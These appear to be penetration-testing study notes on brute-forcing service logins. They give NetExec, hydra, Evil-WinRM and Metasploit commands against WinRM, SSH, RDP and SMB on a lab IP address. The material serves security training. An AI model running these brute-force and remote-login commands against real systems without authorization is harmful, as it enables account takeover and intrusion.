Services include (but are not limited to) `FTP`, `SMB`, `NFS`, `IMAP/POP3`, `SSH`, `MySQL/MSSQL`, `RDP`, `WinRM`, `VNC`, `Telnet`, `SMTP`, and `LDAP`.


## WinRM

Port TCP : HTTP:`5985`
			HTTPS : `5986`


#### NetExec


1. Protocol Specific Help 
```sh
 netexec smb -h
```

#### Usage

```shell
netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

```sh
netexec winrm 10.129.42.197 -u user.list -p password.list
```


#### Evil-WinRM (interaction to the winRm)

```shell-session
evil-winrm -i <target-IP> -u <username> -p <password>
```

```shell-session
evil-winrm -i 10.129.42.197 -u user -p password
```

If the login was successful, a terminal session is initialized using the [Powershell Remoting Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-psrp/602ee78e-9a19-45ad-90fa-bb132b7cecec) (`MS-PSRP`), which simplifies the operation and execution of commands.

November 
## SSH

```shell-session
 hydra -L user.list -P password.list ssh://10.129.42.197
```

## Remote Desktop Protocol (RDP)

```shell-session
hydra -L user.list -P password.list rdp://10.129.42.197
```


## SMB

```shell-session
hydra -L user.list -P password.list smb://10.129.42.197
```


However, we may also get the following error describing that the server has sent an invalid reply.
This is because we most likely have an outdated version of THC-Hydra that cannot handle SMBv3 replies. To work around this problem, we can manually update and recompile `hydra` or use another very powerful tool, the [Metasploit framework](https://www.metasploit.com/).

```shell-session
netexec smb 10.129.42.197 -u "user" -p "password" --shares
```

Msf Module
```shell-session
msf6 auxiliary(scanner/smb/smb_login) > options 
```
